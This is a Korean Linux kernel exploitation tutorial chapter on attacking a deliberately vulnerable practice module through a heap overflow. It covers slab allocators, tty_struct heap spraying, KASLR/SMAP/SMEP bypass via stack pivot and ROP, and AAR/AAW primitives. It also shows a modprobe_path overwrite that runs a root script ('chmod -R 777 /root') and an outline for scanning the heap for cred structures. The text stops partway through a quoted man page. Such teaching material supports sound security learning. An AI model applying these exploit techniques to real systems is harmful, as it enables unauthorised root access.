---
title: "Holstein v2: Heap Overflow의 악용"
tags:
    - [Linux]
    - [Kernel]
    - [Heap Overflow]
    - [kROP]
    - [stack pivot]
    - [AAR]
    - [AAW]
    - [modprobe_path]
    - [core_pattern]
    - [current_task]
    - [cred]
lang: kr
permalink: /kr/linux-kernel/LK01/heap_overflow.html
pagination: true
bk: stack_overflow.html
fd: use_after_free.html
---
앞 장에서는 Holstein 모듈의 Stack Overflow를 악용해 권한 상승에 성공했습니다. Holstein 모듈 개발자는 곧바로 취약점을 수정해 Holstein v2를 공개했습니다. 이 장에서는 개선된 Holstein 모듈 v2를 익스플로잇합니다.

## 패치 분석과 취약점 조사
먼저 [Holstein v2](distfiles/LK01-2.tar.gz)를 다운로드하세요.
`src` 디렉터리의 소스 코드를 확인해 보면, 이전 버전과 차이가 나는 부분은 `module_read`와 `module_write` 두 곳뿐이라는 것을 알 수 있습니다.
```c
static ssize_t module_read(struct file *file,
                           char __user *buf, size_t count,
                           loff_t *f_pos)
{
  printk(KERN_INFO "module_read called\n");

  if (copy_to_user(buf, g_buf, count)) {
    printk(KERN_INFO "copy_to_user failed\n");
    return -EINVAL;
  }

  return count;
}

static ssize_t module_write(struct file *file,
                            const char __user *buf, size_t count,
                            loff_t *f_pos)
{
  printk(KERN_INFO "module_write called\n");

  if (copy_from_user(g_buf, buf, count)) {
    printk(KERN_INFO "copy_from_user failed\n");
    return -EINVAL;
  }

  return count;
}
```
스택 변수를 쓰지 않게 된 대신, 이제 `g_buf`의 내용을 직접 읽고 쓸 수 있게 되었습니다. 물론 여전히 크기 검사가 없기 때문에 오버플로는 남아 있습니다. 이번 취약점은 힙 오버플로입니다.
`g_buf`는 `module_open`에서 할당됩니다.
```c
g_buf = kmalloc(BUFFER_SIZE, GFP_KERNEL);
```
`BUFFER_SIZE`는 `0x400`입니다. 그보다 큰 값을 쓰면 어떻게 되는지 시험해 봅시다.
```c
int main() {
  int fd = open("/dev/holstein", O_RDWR);
  if (fd == -1)
    fatal("/dev/holstein");

  char buf[0x500];
  memset(buf, 'A', 0x500);
  write(fd, buf, 0x500);

  close(fd);
  return 0;
}
```
실제로 프로그램을 실행해 보면, 아래처럼 아무 일도 일어나지 않는 것처럼 보일 것입니다.

<center>
  <img src="img/hbof_nothing.png" alt="힙 오버플로가 바로 크래시를 내지는 않음" style="width:320px;">
</center>

그렇다면 Linux 커널의 힙은 도대체 어떤 구조로 되어 있을까요?

## 슬랩 할당기
커널도 사용자 공간과 마찬가지로 페이지 크기보다 작은 영역을 동적으로 확보해야 하는 경우가 있습니다. 가장 단순한 방법은 `mmap`처럼 페이지 단위로 잘라 쓰는 것이지만, 그러면 쓸모없는 공간이 많이 생겨 메모리 자원이 낭비됩니다.
유저랜드에 `malloc`이 있듯 커널 공간에는 `kmalloc`이 있습니다. 이것은 커널에 내장된 할당기를 이용하는데, 보통 SLAB, SLUB, SLOB 중 하나가 사용됩니다. 세 구현은 완전히 독립적인 것은 아니고 공통된 부분도 있습니다. 이 셋을 묶어서 **슬랩 할당기(slab allocator)**라고 부릅니다. Slab과 SLAB의 차이가 표기상 대소문자뿐이라 헷갈리죠.

이제 각 할당기의 구현을 설명하겠지만, 익스플로잇에서 중요한 부분만 짚겠습니다. 유저랜드 메모리 할당기와 마찬가지로 중요한 점은 다음 두 가지입니다.

- 요청한 크기에 따라 청크가 어디에서 잘려 나오는가
- 해제된 객체가 어떻게 관리되고 이후 할당에서 어떻게 재사용되는가

이 두 점을 중심으로 각 할당기를 살펴봅시다.

### SLAB allocator
SLAB allocator는 역사적으로 가장 오래된 유형이며 Solaris 같은 시스템에서 많이 사용됩니다.
주요 구현은 [/mm/slab.c](https://elixir.bootlin.com/linux/v5.15/source/mm/slab.c)에 있습니다.

SLAB의 특징은 다음과 같습니다.

- **크기에 따른 페이지 프레임 분리**
  libc 메모리 할당기와 달리, 크기대마다 서로 다른 페이지가 사용됩니다. 따라서 청크 앞뒤에 크기 정보가 붙어 있지 않습니다.
- **캐시 사용**
  작은 크기는 크기대별 캐시가 우선적으로 사용됩니다. 크기가 크거나 캐시가 비어 있으면 일반 할당이 사용됩니다.
- **비트맵(index) 기반 free 영역 관리**
  크기대에 따라 페이지 프레임이 달라지므로, 페이지 시작 부분에 "이 페이지 안의 특정 인덱스 영역이 free 상태인지"를 나타내는 비트 배열이 있습니다. libc `malloc`처럼 linked list로 관리하지는 않습니다.

정리하면 free 영역은 아래처럼 페이지 프레임별 인덱스로 관리됩니다.

<center>
  <img src="img/slab_allocator.png" alt="SLAB allocator 그림" style="width:640px;">
</center>

실제로는 캐시 엔트리도 몇 개 존재하고, 거기에 기록된 free 영역 포인터가 우선적으로 사용됩니다.
또한 `__kmem_cache_create`에서 주는 플래그에 따라 다음과 같은 기능도 켤 수 있습니다.

- `SLAB_POISON`: 해제된 영역을 `0xA5`로 채움
- `SLAB_RED_ZONE`: 객체 뒤에 redzone을 두어 Heap Overflow를 탐지

### SLUB allocator
SLUB allocator는 현재 기본으로 사용되는 할당기이며, 큰 시스템을 대상으로 속도를 중시해 설계되었습니다.
주요 구현은 [/mm/slub.c](https://elixir.bootlin.com/linux/v5.15/source/mm/slub.c)에 있습니다.

SLUB의 특징은 다음과 같습니다.

- **크기에 따른 페이지 프레임 분리**
  SLAB과 마찬가지로 크기대마다 사용하는 페이지 프레임이 다릅니다. 예를 들어 100바이트는 `kmalloc-128`, 200바이트는 `kmalloc-256` 같은 식입니다. SLAB과 달리 페이지 프레임 맨 앞에 메타데이터(해제 영역의 인덱스 등)는 없고, freelist의 헤드 포인터 같은 정보는 페이지 프레임 디스크립터에 기록됩니다.
- **단방향 리스트 기반 free 영역 관리**
  SLUB는 libc의 tcache나 fastbin처럼 단방향 리스트로 free 영역을 관리합니다. 해제된 영역의 시작 부분에는 이전에 해제된 영역으로 가는 포인터가 적히고, 마지막 링크는 NULL이 됩니다. tcache나 fastbin의 링크 위조 탐지 같은 특별한 보호는 없습니다.
- **캐시 사용**
  SLAB처럼 CPU별 캐시가 있고, 이것도 SLUB에서는 단방향 리스트 형태입니다.

정리하면 free 영역은 아래처럼 단방향 리스트로 관리됩니다.

<center>
  <img src="img/slub_allocator.png" alt="SLUB allocator 그림" style="width:680px;">
</center>

SLUB에서는 커널 부팅 시 `slub_debug` 파라미터에 문자를 넘겨 디버그 기능을 활성화할 수 있습니다.

- `F`: sanity check 활성화
- `P`: 해제된 영역을 특정 비트 패턴으로 채움
- `U`: 할당과 해제의 스택 트레이스 기록
- `T`: 특정 슬랩 캐시 사용 로그 기록
- `Z`: 객체 뒤에 redzone 추가하여 Heap Overflow 탐지

이 장을 포함해 이후 공격 대상 커널은 기본적으로 SLUB를 사용합니다. 하지만 모든 프로그램이 힙을 공유하는 이상 freelist 자체를 부수는 공격은 현실적으로 잘 성립하지 않으므로, 이 사이트에서는 다루지 않습니다. 앞으로 배우는 기법의 대부분은 다른 할당기에도 그대로 통합니다.

### SLOB allocator
SLOB allocator는 임베디드 시스템을 위한 할당기이며, 가능한 한 가볍게 설계되어 있습니다.
주요 구현은 [/mm/slob.c](https://elixir.bootlin.com/linux/v5.15/source/mm/slob.c)에 있습니다.

SLOB의 특징은 다음과 같습니다.

- **K&R 스타일 allocator**
  고전적인 `malloc`처럼 크기대 구분 없이 앞에서부터 사용 가능한 영역을 잘라 나갑니다. 공간이 부족하면 새 페이지를 확보합니다. 그 결과 단편화가 매우 쉽게 발생합니다.
- **오프셋 기반 free 영역 관리**
  glibc는 tcache나 fastbin처럼 크기별 리스트로 free 영역을 관리합니다. 반면 SLOB는 크기와 관계없이 모든 free 영역이 하나의 체인으로 이어집니다. 또한 링크는 실제 포인터가 아니라 그 청크의 크기와 다음 free 영역까지의 오프셋으로 저장됩니다. 이 정보는 해제된 영역의 앞부분에 기록됩니다. 할당 시에는 이 리스트를 따라가며 충분한 크기의 영역을 찾습니다.
- **크기 기반 freelist**
  단편화를 줄이기 위해, free한 객체를 크기별로 잇는 리스트가 몇 개 따로 존재합니다.

즉 free 영역은 다음처럼 크기와 오프셋 정보를 가진 단방향 리스트로 관리됩니다. (해제된 영역에서 나가는 화살표는 실제 포인터가 아니라 오프셋입니다.)

<center>
  <img src="img/slob_allocator.png" alt="SLOB allocator 그림" style="width:680px;">
</center>

## Heap Overflow의 악용
이제 SLUB가 크기별로 페이지를 나누고, 해제된 영역을 단방향 리스트로 관리한다는 것을 배웠습니다.

[도입](../introduction/introduction.html) 장에서 설명했듯이, 커널 힙은 모든 드라이버와 커널이 공유합니다. 따라서 하나의 드라이버 취약점을 이용해 전혀 다른 커널 객체를 파괴할 수 있습니다. 이번 취약점은 Heap Overflow이므로, 성공적으로 악용하려면 오버플로가 발생하는 영역 바로 뒤에 우리가 파괴하고 싶은 객체가 있어야 합니다.
익스플로잇에 익숙하다면 바로 떠오르겠지만, 이를 위해 Heap Spray가 유용합니다. 여기서는 Heap Spray를 다음 두 목적으로 사용합니다.

1. 이미 존재하는 freelist를 소진한다
   기존 freelist에서 객체가 할당되면, 우리가 파괴하고 싶은 객체와 인접하게 놓인다는 보장이 없습니다. 따라서 대상 크기대의 freelist를 미리 소비해야 합니다.
2. 객체를 서로 붙여 놓는다
   freelist를 소진한 뒤에는 객체가 붙을 가능성이 높지만, 할당기가 페이지를 앞에서부터 소모하는지 뒤에서부터 소모하는지 명확하지 않을 수 있습니다. 그래서 그냥 Heap Overflow가 있는 객체의 앞뒤를 우리가 노리는 객체로 채워 버립니다.

다음으로 문제 되는 것은 객체 크기입니다. Holstein의 소스 코드를 다시 보면, 할당되는 버퍼 크기는 `0x400`입니다.
```c
#define BUFFER_SIZE 0x400
```
`0x400`은 `kmalloc-1024`에 해당합니다. (시스템의 slab 정보는 `/proc/slabinfo`에서 볼 수 있습니다.)
따라서 우리가 파괴할 수 있는 객체도 기본적으로 크기 `0x400`인 것이어야 합니다. 공격 관점에서 [쓸 만한 객체를 크기별로 정리한 글](https://ptr-yudai.hatenablog.com/entry/2020/03/16/165628)을 예전에 쓴 적이 있으니 참고하세요.[^1]

이번 `kmalloc-1024`에서는 `tty_struct`라는 구조체가 유용해 보입니다. `tty_struct`는 [`tty.h`](https://elixir.bootlin.com/linux/v5.15/source/include/linux/tty.h#L143)에 정의되어 있고, TTY 관련 상태를 담는 구조체입니다. 이 구조체 크기가 `kmalloc-1024`에 들어가므로, 이번 취약점으로 범위 밖 읽기/쓰기가 가능합니다. 일부 멤버를 보면 다음과 같습니다.
```c
struct tty_struct {
	int	magic;
	struct kref kref;
	struct device *dev;	/* class device or NULL (e.g. ptys, serdev) */
	struct tty_driver *driver;
	const struct tty_operations *ops;
	int index;
    ...
```
여기서 `tty_operations`는 해당 TTY에 대한 연산을 담고 있는 함수 테이블입니다.
프로그램에서 다음처럼 `/dev/ptmx`를 열면 커널 공간에 `tty_struct`가 할당됩니다.
```c
int ptmx = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
```
그 뒤 `read`, `write`, `ioctl` 같은 작업을 하면 `tty_operations`에 적힌 함수 포인터가 호출됩니다.

## ROP를 이용한 익스플로잇
필요한 배경지식은 모두 갖췄으므로, 이제 권한 상승 익스플로잇을 작성해 봅시다.

### 힙 오버플로 확인
먼저 `gdb`를 써서 실제로 힙 오버플로가 일어나는지 확인해 봅시다. 동시에 Heap Spray도 보기 위해 다음과 같은 코드를 사용합니다.
```c
int main() {
  int spray[100];
  for (int i = 0; i < 50; i++) {
    spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
    if (spray[i] == -1)
      fatal("/dev/ptmx");
  }

  // 주변에 tty_struct가 있는 위치에 할당되게 함
  int fd = open("/dev/holstein", O_RDWR);
  if (fd == -1)
    fatal("/dev/holstein");

  for (int i = 50; i < 100; i++) {
    spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
    if (spray[i] == -1)
      fatal("/dev/ptmx");
  }

  // Heap Buffer Overflow
  char buf[0x500];
  memset(buf, 'A', 0x500);
  write(fd, buf, 0x500);

  getchar(); // 멈춤

  close(fd);
  return 0;
}
```
평소처럼 KASLR을 끄고 `/proc/modules`를 확인한 뒤, `gdb`로 attach해서 `write` 핸들러 근처에 브레이크포인트를 걸어 봅시다. `g_buf` 주소를 알고 싶었기 때문에 아래 명령 바로 뒤에 브레이크포인트를 두었습니다.

<center>
  <img src="img/ida_holstein2_write.png" alt="브레이크포인트 위치" style="width:320px;">
</center>

브레이크포인트에서 버퍼와 주변 메모리를 확인해 보면, 비슷한 형태의 객체가 주변에 배치되어 있는 것을 볼 수 있습니다.

<center>
  <img src="img/gdb_spray.png" alt="gdb로 Heap Spray 확인" style="width:640px;">
</center>

이것이 바로 spray한 `tty_struct`들입니다. 이번에는 이 객체를 Heap Buffer Overflow로 파괴해서 권한 상승을 노립니다. 오버플로가 발생한 뒤 상태를 보면, `g_buf` 바로 뒤에 있던 `tty_struct`가 실제로 깨진 것을 확인할 수 있습니다.

<center>
  <img src="img/gdb_tty_bof.png" alt="tty_struct 파괴" style="width:640px;">
</center>

### KASLR 우회
Holstein v1에서는 보안 기법을 하나씩 우회했지만, 이번에는 KASLR, SMAP, SMEP, KPTI를 한 번에 모두 우회해 봅시다. (물론 디버깅할 때는 KASLR을 끄는 것이 좋습니다.)

이번 Heap Buffer Overflow는 쓰기뿐 아니라 읽기도 가능하므로, `tty_struct`를 읽어서 KASLR을 우회할 수 있습니다. 예를 들어 위에서 본 `tty_struct`에서 시작으로부터 `0x18` 오프셋에 있는 포인터, 즉 `ops`는 명백히 커널 주소이므로 여기서 베이스 주소를 계산할 수 있습니다.
```c
#define ofs_tty_ops 0xc38880
unsigned long kbase;
...
  // KASLR 우회
  char buf[0x500];
  read(fd, buf, 0x500);
  kbase = *(unsigned long*)&buf[0x418] - ofs_tty_ops;
  printf("[+] kbase = 0x%016lx\n", kbase);
```

### SMAP 우회: RIP 제어
커널 베이스 주소를 알게 되면, `ops` 함수 테이블을 덮어써서 RIP도 제어할 수 있을 것처럼 보입니다. 하지만 실제로는 그렇게 단순하지 않습니다. `ops`는 함수 포인터 하나가 아니라 함수 테이블에 대한 포인터이므로, RIP를 제어하려면 가짜 함수 테이블을 가리키게 만들어야 합니다.
SMAP이 꺼져 있다면 사용자 공간에 가짜 함수 테이블을 만들고 그 포인터를 `ops`에 써 넣으면 됩니다. 하지만 이번에는 SMAP이 켜져 있으므로 커널이 사용자 공간 데이터를 참조할 수 없습니다.

그렇다면 SMAP을 어떻게 우회할까요?
우리가 커널 공간에 제어된 데이터를 쓸 수 있는 곳은 힙뿐이므로, 힙 주소 누출이 필요합니다. `gdb`에서 `tty_struct`를 보면 힙 주소처럼 보이는 포인터가 몇 개 보입니다.

<center>
  <img src="img/gdb_tty_struct.png" alt="tty_struct 내부 모습" style="width:640px;">
</center>

특히 `0x38` 부근의 포인터는 정확히 그 `tty_struct` 내부를 가리키고 있습니다.[^2] 이 포인터로부터 `tty_struct` 자체의 주소를 계산할 수 있고, 거기서 `0x400`을 빼면 `g_buf` 주소도 구할 수 있습니다. `g_buf` 내용은 우리가 통제할 수 있으므로, 여기에 가짜 `ops` 함수 테이블을 놓고 Heap Overflow로 `ops`를 덮어씁니다.
덮어쓴 `tty_struct`에 적당한 연산을 수행하면 RIP를 제어할 수 있지만, 어떤 `tty_struct`가 맞았는지 모르므로 spray한 모든 FD에 대해 작업을 시도합니다. 또한 함수 테이블의 어느 엔트리가 호출되는지도 모르므로, 우선 가짜 테이블에 식별용 값을 채워 넣고 크래시 메시지로 호출된 위치를 확인합니다.
```c
  // g_buf 주소 누출
  g_buf = *(unsigned long*)&buf[0x438] - 0x438;
  printf("[+] g_buf = 0x%016lx\n", g_buf);

  // 가짜 함수 테이블 쓰기
  unsigned long *p = (unsigned long*)&buf;
  for (int i = 0; i < 0x40; i++) {
    *p++ = 0xffffffffdead0000 + (i << 8);
  }
  *(unsigned long*)&buf[0x418] = g_buf;
  write(fd, buf, 0x420);

  // RIP 제어
  for (int i = 0; i < 100; i++) {
    ioctl(spray[i], 0xdeadbeef, 0xcafebabe);
  }
```
다음처럼 RIP가 떨어지면 성공입니다.

<center>
  <img src="img/crash_ioctl.png" alt="tty_struct 덮어쓰기로 RIP 제어" style="width:720px;">
</center>

이번에는 `ioctl`을 썼고, `0xffffffffdead0c00`에서 크래시가 났으므로 `ioctl`에 대응하는 함수 포인터는 12번째(`0xC`) 엔트리라는 것도 알 수 있습니다.

### SMEP 우회: Stack Pivot
앞의 Stack Overflow 장과 마찬가지로, RIP를 잡은 뒤에는 ROP로 SMEP을 우회할 수 있습니다. SMEP이 없다면 그냥 `ret2usr`면 충분하지만, SMEP만 우회하는 목적이라면 예를 들어 다음 gadget을 쓸 수 있습니다.
```
0xffffffff81516264: mov esp, 0x39000000; ret;
```
미리 사용자 공간의 `0x39000000`을 `mmap`으로 확보하고 거기에 ROP chain을 써 둔 뒤 이 gadget을 호출하면, 사용자 공간의 ROP chain으로 stack pivot이 이루어집니다.
하지만 이번에는 SMAP이 활성화되어 있으므로 사용자 공간에 둔 ROP chain을 실행할 수 없습니다. 다행히도 제어 가능한 커널 공간, 즉 힙 주소를 알고 있으므로 가짜 함수 테이블과 ROP chain을 함께 힙에 써 넣고 거기서 실행시키면 됩니다.

힙에 있는 ROP chain을 실행하려면 스택 포인터 `rsp`를 힙 주소로 옮겨야 합니다. 앞에서 다음 호출을 했을 때:
```c
ioctl(spray[i], 0xdeadbeef, 0xcafebabe);
```
그 크래시 메시지를 다시 보면 `ioctl` 인수가 일부 레지스터에 들어간 것을 볼 수 있습니다.
```
RCX: 00000000deadbeef
RDX: 00000000cafebabe
RSI: 00000000deadbeef
R08: 00000000cafebabe
R12: 00000000deadbeef
R14: 00000000cafebabe
```
즉 `ioctl` 인수로 ROP chain의 주소를 전달하고, `mov rsp, rcx; ret;` 같은 gadget을 부를 수 있다면 ROP가 가능합니다.

<div class="balloon_l">
  <div class="faceicon"><img src="../img/wolf_atamawaru.png" alt="늑대" ></div>
  <p class="says">
    <code>write</code>나 <code>read</code> 인수는 버퍼 주소가 유저랜드 범위인지 검사되거나, 크기가 너무 크면 핸들러 자체가 호출되지 않는 경우가 있어서, 커널 힙으로의 stack pivot에는 잘 안 쓰이는 경우가 많아.
  </p>
</div>

커널이라고 해도 `mov rsp, rcx; ret;`처럼 단순한 gadget은 찾기 어렵지만, `push rcx; ...; pop rsp; ...; ret;` 형태의 gadget은 꽤 높은 확률로 존재합니다. 이번에는 다음 gadget을 사용합니다.
```
0xffffffff813a478a: push rdx; mov ebp, 0x415bffd9; pop rsp; pop r13; pop rbp; ret;
```
우선 ROP chain에 도달하는지만 확인해 봅시다. 아래 예시에서는 ROP chain 안의 `0xffffffffdeadbeef`에서 크래시가 나면 성공입니다.
```c
  // 가짜 함수 테이블 쓰기
  unsigned long *p = (unsigned long*)&buf;
  p[12] = rop_push_rdx_mov_ebp_415bffd9h_pop_rsp_r13_rbp;
  *(unsigned long*)&buf[0x418] = g_buf;

  // ROP chain 준비
  p[0] = 0xffffffffdeadbeef;

  // Heap Buffer Overflow
  write(fd, buf, 0x420);

  // RIP 제어
  for (int i = 0; i < 100; i++) {
    ioctl(spray[i], 0xdeadbeef, g_buf - 0x10); // r13, rbp 공간만큼 뺌
  }
```

### 권한 상승
이제 남은 것은 실제 ROP chain을 작성하는 일뿐입니다. 현재 `p[12]`는 RIP를 잡기 위한 함수 포인터로 이미 사용 중이므로, 그 슬롯만 `pop` gadget으로 건너뛰거나, 함수 테이블을 `ops` 뒤쪽에 두고 `g_buf`는 ROP chain 전용으로 쓰는 식으로 구성하면 됩니다.

좋아하는 방식으로 ROP를 작성해 보세요. ROP가 올바르게 동작한다면 KASLR, SMAP, SMEP, KPTI가 모두 활성화된 상태에서도 권한 상승에 성공해야 합니다.
예제 익스플로잇은 [여기](exploit/heapbof-krop.c)에서 다운로드할 수 있습니다.

<center>
  <img src="img/hbof_privesc.png" alt="권한 상승 성공" style="width:320px;">
</center>

## AAR/AAW를 이용한 익스플로잇
앞의 예시에서는 `push rdx; mov ebp, 0x415bffd9; pop rsp; pop r13; pop rbp; ret;`라는 stack pivot gadget을 사용했습니다. 직접 gadget을 찾은 분들도 비교적 복잡한 gadget만 찾았을 가능성이 큽니다. 이번처럼 한 번의 RIP 제어만으로 stack pivot이 가능한 gadget이 항상 존재하는 것은 아닙니다. 그렇다면 stack pivot이 불가능할 때는 어떻게 해야 할까요?

이런 상황에서도 높은 확률로 존재하는 gadget을 이용해 안정적인 익스플로잇을 작성하는 [기법](https://pr0cf5.github.io/ctf/2020/03/09/the-plight-of-tty-in-the-linux-kernel.html)이 있습니다. 다시 한 번 RIP를 제어했을 때의 레지스터 상태를 봅시다.
```
ioctl(spray[i], 0xdeadbeef, 0xcafebabe);

RCX: 00000000deadbeef
RDX: 00000000cafebabe
RSI: 00000000deadbeef
R08: 00000000cafebabe
R12: 00000000deadbeef
R14: 00000000cafebabe
```
이번에는 함수 포인터 덮어쓰기, 즉 `call` 명령을 통해 RIP를 제어하고 있으므로, `ret`으로 끝나는 코드로 점프하기만 하면 `ioctl` 처리가 정상적으로 끝나고 사용자 공간으로 복귀합니다. 그렇다면 다음과 같은 gadget을 호출하면 무엇이 가능할까요?
```
0xffffffff810477f7: mov [rdx], rcx; ret;
```
지금은 `rdx`와 `rcx`를 모두 제어할 수 있으므로, 이 gadget으로 임의 주소에 임의의 4바이트 값을 쓸 수 있습니다. 이런 형태의 `mov` gadget은 꽤 높은 확률로 존재합니다. 즉 함수 포인터를 통한 RIP 제어가 가능한 상황이라면 AAW primitive를 만들 수 있습니다.
그렇다면 다음 gadget은 어떨까요?
```
0xffffffff8118a285: mov eax, [rdx]; ret;
```
이 경우 임의 주소에 저장된 4바이트 값을 `ioctl`의 반환값으로 받을 수 있습니다. (`ioctl` 반환형이 `int`이므로 한 번에 최대 4바이트까지 읽을 수 있습니다.) 즉 AAR primitive도 만들 수 있습니다.

그렇다면 커널 공간 임의 주소 읽기/쓰기가 가능할 때, 우리는 무엇을 할 수 있을까요?

### `modprobe_path`와 `core_pattern`
Linux 커널은 어떤 커널 내부 이벤트에 대응해 사용자 공간 프로그램을 실행하고 싶을 때가 있습니다. 이런 경우 Linux는 [`call_usermodehelper`](https://elixir.bootlin.com/linux/v5.15/source/kernel/umh.c#L474)라는 함수를 사용합니다. `call_usermodehelper`를 사용하는 경로는 여러 개 있지만, 사용자 공간에서 특권 없이 도달할 수 있는 대표적인 경로가 `modprobe_path`와 `core_pattern`입니다.

[`modprobe_path`](https://elixir.bootlin.com/linux/v5.15/source/kernel/kmod.c#L61)는 [`__request_module`](https://elixir.bootlin.com/linux/v5.15/source/kernel/kmod.c#L170)에서 사용하는 명령 문자열이며, 쓰기 가능한 영역에 존재합니다.
Linux는 여러 실행 파일 형식을 지원합니다. 실행 권한이 있는 파일이 실행되면 커널은 헤더 바이트 등을 보고 형식을 판별합니다. 기본적으로 ELF와 shebang 스크립트가 등록되어 있는데, 등록된 어떤 형식과도 맞지 않는 파일을 실행하려고 하면 `__request_module`가 호출됩니다. `modprobe_path`에는 기본값으로 `/sbin/modprobe`가 들어 있으며, 이것을 덮어쓴 뒤 잘못된 형식의 실행 파일을 실행시키면 우리가 원하는 명령을 실행시킬 수 있습니다.

비슷하게 커널이 실행하는 다른 명령 문자열로 [`core_pattern`](https://elixir.bootlin.com/linux/v5.15/source/fs/coredump.c#L57)이 있습니다. 이것은 사용자 공간 프로그램이 크래시했을 때 [`do_coredump`](https://elixir.bootlin.com/linux/v5.15/source/fs/coredump.c#L577)에서 사용하는 문자열입니다. 정확히는 `core_pattern`이 파이프 문자 `|`로 시작할 때 그 뒤의 명령이 실행됩니다. 예를 들어 Ubuntu 20.04에서는 기본값이 다음과 같습니다.
```
|/usr/share/apport/apport %p %s %c %d %P %E
```
외부 명령이 설정되어 있지 않으면 단순히 `core`라는 문자열이 들어 있습니다. (`core dump` 파일 이름이 됩니다.) AAW로 `core_pattern`을 덮어쓰면, 사용자 공간 프로그램이 크래시할 때 커널이 특권으로 외부 프로그램을 실행하므로, 일부러 프로그램을 크래시시켜 권한 상승을 일으킬 수 있습니다.

<div class="balloon_l">
  <div class="faceicon"><img src="../img/wolf_normal.png" alt="늑대" ></div>
  <p class="says">
    변수의 주소는 FGKASLR 영향을 받지 않으니까, FGKASLR이 활성화된 경우에도 여전히 쓸 수 있겠네.
  </p>
</div>

이번에는 `modprobe_path`를 덮어써 권한 상승을 해 봅시다. 우선 그 주소를 찾아야 합니다. 심볼 정보가 있으면 `kallsyms` 등으로 찾으면 되고, 이번 커널은 심볼이 제거되어 있으므로 직접 찾아야 합니다. `core_pattern`도 마찬가지인데, 실전에서는 `vmlinux`에서 문자열을 찾는 방법이 가장 쉽습니다.[^3]
```
$ python
>>> from ptrlib import ELF
>>> kernel = ELF("./vmlinux")
>>> hex(next(kernel.search("/sbin/modprobe\0")))
0xffffffff81e38180
```
이를 `gdb`에서 확인하면 실제로 `/sbin/modprobe`가 그 위치에 있습니다.
```
pwndbg> x/1s 0xffffffff81e38180
0xffffffff81e38180:     "/sbin/modprobe"
```
이제 주소를 알았으니 AAW로 덮어써 봅시다. 안정적인 AAR/AAW가 있다면, 익스플로잇을 함수처럼 호출 가능한 형태로 설계해 두는 것이 편합니다.
```c
void AAW32(unsigned long addr, unsigned int val) {
  unsigned long *p = (unsigned long*)&buf;
  p[12] = rop_mov_prdx_rcx;
  *(unsigned long*)&buf[0x418] = g_buf;
  write(fd, buf, 0x420);

  // mov [rdx], rcx; ret;
  for (int i = 0; i < 100; i++) {
    ioctl(spray[i], val /* rcx */, addr /* rdx */);
  }
}
...
  char cmd[] = "/tmp/evil.sh";
  for (int i = 0; i < sizeof(cmd); i += 4) {
    AAW32(addr_modprobe_path + i, *(unsigned int*)&cmd[i]);
  }
```
위 예시에서는 형식을 알 수 없는 실행 파일이 실행되려 할 때 `/tmp/evil.sh`가 호출됩니다. 따라서 `/tmp/evil.sh` 안에는 우리가 실행시키고 싶은 작업을 적으면 됩니다. 여기서는 다음과 같은 스크립트를 사용합니다.
```sh
#!/bin/sh
chmod -R 777 /root
```
마지막으로 아무 잘못된 실행 파일이나 하나 만들어 실행하면 됩니다.
```c
  system("echo -e '#!/bin/sh\nchmod -R 777 /root' > /tmp/evil.sh");
  system("chmod +x /tmp/evil.sh");
  system("echo -e '\xde\xad\xbe\xef' > /tmp/pwn");
  system("chmod +x /tmp/pwn");
  system("/tmp/pwn"); // modprobe_path 트리거
```
익스플로잇이 성공하면, 임의 명령이 root 권한으로 실행된 것을 확인할 수 있습니다.

<center>
  <img src="img/hbof_modprobe_path.png" alt="modprobe_path를 통한 권한 상승" style="width:400px;">
</center>

이 익스플로잇은 [여기](exploit/heapbof-aaw.c)에서 다운로드할 수 있습니다.

### `cred` 구조체
[앞 장](stack_overflow.html)에서 설명했듯이, 프로세스의 권한은 `cred` 구조체로 관리됩니다. `cred` 안에는 해당 프로세스의 실효 사용자 ID 같은 정보가 들어 있으므로, 자기 프로세스의 `cred`에 있는 각종 ID를 root(`0`)로 바꾸면 권한 상승이 됩니다. 그렇다면 자기 프로세스의 `cred` 주소는 어떻게 구할까요?

예전 Linux 커널에는 `current_task`라는 전역 심볼이 있어서, 현재 컨텍스트의 `task_struct`에 대한 포인터가 거기에 들어 있었습니다. 그래서 AAR/AAW를 가지고 있을 때는 `task_struct`에서 `cred`를 따라가 권한 상승하는 것이 쉬웠습니다.
하지만 최근 커널에서는 `current_task`가 전역 변수에서 사라지고, 대신 CPU별 저장 공간에 들어가 `gs` 레지스터를 통해 접근하게 되었습니다. 따라서 프로세스의 `cred`를 직접 찾을 수는 없지만, AAR가 있으면 여전히 비교적 간단합니다. 커널 힙은 그렇게까지 넓지 않기 때문에, Kernel Exploit에서는 힙 전체를 스캔해서 `cred` 구조체를 찾는 것이 가능합니다. 이번 익스플로잇에서는 이미 힙 주소 하나를 알고 있으므로 그 방법을 쓸 수 있습니다. 즉 다음과 같은 코드로 권한 상승이 가능합니다. (이번에는 `ioctl`로 한 번에 최대 4바이트까지 읽을 수 있으므로 4바이트씩 확인합니다.)
```c
for (u64 p = heap_address; ; p += 4) {
  u32 leak = AAR_32bit(p); // AAR
  if (looks_like_cred(leak)) { // cred 구조체처럼 보임
    memcpy(p + XXX, 0, YYY); // 실효 UID 덮어쓰기
  }
}
```
문제는 어떻게 자기 프로세스의 `cred`를 찾느냐입니다. 이를 위해 [**`task_struct` 구조체**](https://elixir.bootlin.com/linux/v5.15/source/include/linux/sched.h#L723)의 멤버를 다시 보겠습니다.
```c
struct task_struct {
    ...
	/* Process credentials: */

	/* Tracer's credentials at attach: */
	const struct cred __rcu		*ptracer_cred;

	/* Objective and real subjective task credentials (COW): */
	const struct cred __rcu		*real_cred;

	/* Effective (overridable) subjective task credentials (COW): */
	const struct cred __rcu		*cred;

#ifdef CONFIG_KEYS
	/* Cached requested key. */
	struct key			*cached_requested_key;
#endif

	/*
	 * executable name, excluding path.
	 *
	 * - normally initialized setup_new_exec()
	 * - access it with [gs]et_task_comm()
	 * - lock it with task_lock()
	 */
	char				comm[TASK_COMM_LEN];

    ...
}
```
여기서 중요한 것은 `comm` 필드입니다. 여기에 프로세스 실행 파일 이름이 최대 16바이트 저장됩니다. 이 값은 `prctl`의 `PR_SET_NAME` 옵션으로 바꿀 수 있습니다.
```
PR_SET_NAME (since Linux 2.6.9)
    Set  the name of the calling thread, using the value in the location pointed to by (char *) arg2.  The name can be up to 16 bytes long, including the terminating null byte.  (If the
    length of the string, including the terminating null byte, exceeds 16 bytes, the string is silently truncated.)  This is the same attribute that can be set via pthread_setname_np(3)
